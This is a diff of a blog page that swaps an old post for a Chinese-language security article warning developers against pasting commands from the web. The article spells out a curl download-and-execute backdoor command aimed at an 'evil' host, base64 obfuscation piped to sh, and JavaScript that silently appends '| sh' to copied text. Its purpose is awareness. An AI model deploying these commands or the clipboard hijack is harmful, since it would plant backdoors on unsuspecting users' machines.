@@ -20,7 +20,7 @@
 	<link rel="preconnect" href="//9qpuwspm.api.lncld.net">
 	<link rel="preconnect" href="//gravatar.loli.net">
 
-	<title>為何我選擇hexo當作個人blog? | yiyu0x's blog</title>
+	<title>從駭客角度告訴你為何不要隨意複製指令 | yiyu0x's blog</title>
 
 	<meta name="HandheldFriendly" content="True">
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -50,14 +50,14 @@
 
 	<meta property="og:site_name" content="yiyu0x's blog">
 	<meta property="og:type" content="article">
-	<meta property="og:title" content="為何我選擇hexo當作個人blog? | yiyu0x's blog">
+	<meta property="og:title" content="從駭客角度告訴你為何不要隨意複製指令 | yiyu0x's blog">
 	<meta property="og:description" content>
-	<meta property="og:url" content="https://blog.yiyu0x.site/2019/02/26/為何我選擇hexo當作個人blog/">
+	<meta property="og:url" content="https://blog.yiyu0x.site/2020/03/16/從駭客角度告訴你為何不要隨意複製指令/">
 
 	
-	<meta property="article:published_time" content="2019-02-26T21:02:00+08:00"> 
+	<meta property="article:published_time" content="2020-03-16T11:03:00+08:00"> 
 	<meta property="article:author" content="yiyu0x">
-	<meta property="article:published_first" content="yiyu0x's blog, /2019/02/26/為何我選擇hexo當作個人blog/">
+	<meta property="article:published_first" content="yiyu0x's blog, /2020/03/16/從駭客角度告訴你為何不要隨意複製指令/">
 	
 
 	
@@ -162,44 +162,75 @@
     <div class="inner">
         <header class="post-full-header">
             <div class="post-full-meta">
-                <time class="post-full-meta-date" datetime="2019-02-26T13:48:32.000Z">
-                    2019-02-26
+                <time class="post-full-meta-date" datetime="2020-03-16T03:13:36.000Z">
+                    2020-03-16
                 </time>
                 
                 <span class="date-divider">/</span>
                 
                 
             </div>
-            <h1 class="post-full-title">為何我選擇hexo當作個人blog?</h1>
+            <h1 class="post-full-title">從駭客角度告訴你為何不要隨意複製指令</h1>
         </header>
         <div class="post-full no-image">
             
             <div class="post-full-content">
                 <article id="photoswipe" class="markdown-body">
-                    <html><head></head><body><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在網路上爬文學習的過程中，發現有很多人將技術文章或是教學文章都放在自己架設的部落格中。若不是放在自己的部落格中，多半是選擇 Medium 。</p>
-<p>我也有考慮過 <code>wordpress</code>, <code>Medium</code></p>
-<p>最後決定使用 <code>hexo</code> 來架設靜態網站。</p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>這篇文章當作部落格的第一篇文章在適合不過了。</p>
-<p>選擇 hexo 有幾個原因。</p>
-<ol>
-<li>滿足自己管理網站的慾望。 (有自己的 domain name 就是開心，有種一切都是自己掌管的感覺)</li>
-<li>相較於 wordpress 可以更加容易部署與轉移環境</li>
-<li>以防自己的 VPS 主機有什麼三長兩短，還可以部署在 github 上</li>
-<li>markdown 語法的支援。已經習慣 markdown 了，實在不太想花心思去學其他種語法(雖然也有看到人家說 Medium 的語法很好上手，但我就是懶)</li>
-</ol>
-<p>從我決定要使用 hexo 到真正部署上線花的時間約莫不到一小時，其中有比較多的時間是在看主題的設定檔，修改一些設定。</p>
-<h2 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h2><p>基本上 hexo-cli 就能完成大部分的事情，從建立完文章模板，打開編輯器編輯文章，產生靜態檔案，部署。</p>
-<p>對於常常接觸 cli 的人來說完全不成問題，使用第一天的心得還算滿意。</p>
-<p>之後沒意外的話除了部署在 github.io 以外，也部署在自己的主機上。</p>
-<!-- <img src="/2019/02/26/為何我選擇hexo當作個人blog/hexo.png"> -->
-<p><img alt="1" class="post-img b-lazy" data-img="/2019/02/26/為何我選擇hexo當作個人blog/hexo.png" data-index="0" data-src="/2019/02/26/為何我選擇hexo當作個人blog/hexo.png"></p>
-<p>補上一張螢幕截圖，結束第一篇文章 😄</p>
+                    <html><head></head><body><p>相信很多人都有這樣的經驗，下指令時產生某某錯誤。這個錯誤可能沒見過，也可能是之前遇過但是忘記怎麼解。但我們只要將錯誤複製起來，貼上搜尋引擎，馬上就會跳出各種網頁可以參考，無倫是知名的程式討論論壇，或著是官方文件，又或著是個人自行架設的部落格。看到指令就貼上這個習慣，是開發者的眾多壞習慣之一。</p>
+<p>駭客可以很巧妙的利用這一點，將精心製作的後門程式（或其他惡意程式），透過包裝，誘騙受害者（可能就是你）去執行。</p>
+<h2 id="生產惡意指令"><a href="#生產惡意指令" class="headerlink" title="生產惡意指令"></a>生產惡意指令</h2><p>假如今天我想要讓受害者的電腦執行一條指令就被植入後門，我會這麼做：</p>
+<p><code>curl https://evil.yiyu0x.site/evil --output evil --silent && chmod +x evil && ./evil && rm ./evil</code></p>
+<p>首先先透過 <code>curl</code> 下載遠端編譯好的惡意程式，並且給予該程式執行權限，然後執行，最後刪除（匿蹤）。</p>
+<p>但這種指令我想應該沒有人會直接貼上執行，不但意圖明顯，而且還直接告訴受害者：「我打算下載來路不名的檔案，而且要執行它」。</p>
+<h2 id="偽裝"><a href="#偽裝" class="headerlink" title="偽裝"></a>偽裝</h2><p>想要偽裝通常我們會將指令包裹成其他意圖，透過簡單的編碼來將這個惡意指令進行編碼，以下選用 base64 進行編碼：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA==</span><br></pre></td></tr></tbody></table></figure>
+
+<p>為何選擇使用 <code>base64</code>，原因是因為 Linux 內建就有 base64 工具，受害人可以透過執行 base64 解碼工具，解出具有意義的字串</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"Y3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA=="</span> | base64 -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p>output:</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://evil.yiyu0x.site/evil --output evil --silent && chmod +x evil && ./evil && rm ./evil</span><br></pre></td></tr></tbody></table></figure>
+
+<p>接著將字串 pipe 到 <code>sh</code> 就可以直接運行：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"Y3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA=="</span> | base64 -d | sh</span><br></pre></td></tr></tbody></table></figure>
+
+<p>以上指令就沒有辦法一眼就看出目的，但意圖不變。</p>
+<h2 id="進一步偽裝"><a href="#進一步偽裝" class="headerlink" title="進一步偽裝"></a>進一步偽裝</h2><p>有經驗的開發者看到指令中帶有 <code>sh</code> 就會馬上起疑心，這是一件好事。因為本來就不應該隨便下具有執行權限的指令，何況你根本不知道那串 <code>base64</code> 字串解出來為何。</p>
+<p>我們可以先將我們的惡意指令多新增一個功能，印出一些字串，讓受害者以為這串 <code>base64</code> 就是一個普通的字串而已：</p>
+<p><code>echo "Hi, Im yiyu0x :)" && curl https://evil.yiyu0x.site/evil --output evil --silent && chmod +x evil && ./evil && rm ./evil</code></p>
+<p>進行編碼：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA==</span><br></pre></td></tr></tbody></table></figure>
+
+<p>惡意指令：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"ZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA=="</span> | base64 -d | sh</span><br></pre></td></tr></tbody></table></figure>
+
+<p>執行後的結果：</p>
+<p><code>Hi, Im yiyu0x :)</code></p>
+<p>如果我將個指令放在一些顯眼的地方像是網站的自我介紹、說明欄，我相信有些具有好奇心的讀者可能就會傻傻執行。但是一些具有經驗的讀者還是會發現句尾帶的那個 <code>sh</code>，而不去執行它。</p>
+<p>那我如果改成這樣呢？</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"ZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA=="</span> | base64 -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p>這樣子我相信 9 成以上的人（包含我自己），都會想把這段指令貼上去執行看一下結果為何，畢竟就是一條單純的解碼指令，怎麼可能有害？</p>
+<p>但是別忘了，惡意攻擊者可以在網頁中的 JS 插入：</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> source = <span class="built_in">document</span>.querySelector(<span class="string">'div.source'</span>) <span class="comment">//指令區塊</span></span><br><span class="line">source.addEventListener(<span class="string">'copy'</span>, (event) => {</span><br><span class="line">    <span class="keyword">const</span> selection = <span class="built_in">document</span>.getSelection()</span><br><span class="line">    event.clipboardData.setData(<span class="string">'text/plain'</span>, selection.toString() + <span class="string">'| sh'</span>)</span><br><span class="line">    event.preventDefault()</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure>
+
+<p>該程式碼的意思為當你複製字串時，自動將剪貼板中的字串末端加上 <code>| sh</code>，意思就是你複製到的字串其實是：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"ZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA=="</span> | base64 -d | sh</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果你貼上 terminal 之後沒有檢查就直接按下 enter，那麼你的電腦就不知不覺的執行了一個執行檔而你完全沒有感覺。</p>
+<p>想想看，如果在開發者的部落格自我介紹，放入這種指令式的自我介紹是不是很有趣？或是放在臉書的自我介紹？當你很開心的貼上指令時，很可能默默中了人家的後門程式。</p>
+<h2 id="最後"><a href="#最後" class="headerlink" title="最後"></a>最後</h2><p>該文章的重點無非還是提醒幾點資安的意識：</p>
+<ul>
+<li>來路不明的指令不要貼上終端機執行</li>
+<li>不要相信剪貼板的內容，按下 Enter 執行前應該肉眼再度檢查一次指令</li>
+</ul>
+<p>最後提醒大家，在未經同意下入侵他人電腦是有刑責的，不要以身試法！</p>
 </body></html>
                 </article>
                 <ul class="tags-postTags">
                     
                     <li>
-                        <a href="/tags/個人/" rel="tag"># 個人</a>
+                        <a href="/tags/資訊安全/" rel="tag"># 資訊安全</a>
                     </li>
                     
                 </ul>
@@ -210,11 +241,11 @@
     
     <nav id="gobottom" class="pagination">
         
-        <a class="prev-post" title="如何看待C語言的argv與指標關係" href="/2019/03/01/如何看待C語言的argv與指標關係/">
-            ← 如何看待C語言的argv與指標關係
-        </a>
-        
         <span class="prev-next-post">·</span>
+        
+        <a class="next-post" title="重新看懂指標與陣列之間的交互關係" href="/2020/02/15/重新看懂指標與陣列之間的交互關係/">
+            重新看懂指標與陣列之間的交互關係 →
+        </a>
         
     </nav>
 
@@ -239,7 +270,7 @@
         </a>
     </div>
     <div class="toc-main">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#心得"><span class="toc-text">心得</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#生產惡意指令"><span class="toc-text">生產惡意指令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#偽裝"><span class="toc-text">偽裝</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#進一步偽裝"><span class="toc-text">進一步偽裝</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#最後"><span class="toc-text">最後</span></a></li></ol>
     </div>
 </div>
 
@@ -461,7 +492,7 @@
 			<a href="/" title="yiyu0x's blog">yiyu0x's blog &copy; 2020</a>
 			
 				
-			        <span hidden="true" id="/2019/02/26/為何我選擇hexo當作個人blog/" class="leancloud-visitors" data-flag-title="為何我選擇hexo當作個人blog?">
+			        <span hidden="true" id="/2020/03/16/從駭客角度告訴你為何不要隨意複製指令/" class="leancloud-visitors" data-flag-title="從駭客角度告訴你為何不要隨意複製指令">
 			            <span>阅读量 </span>
 			            <span class="leancloud-visitors-count">0</span>
 			        </span>
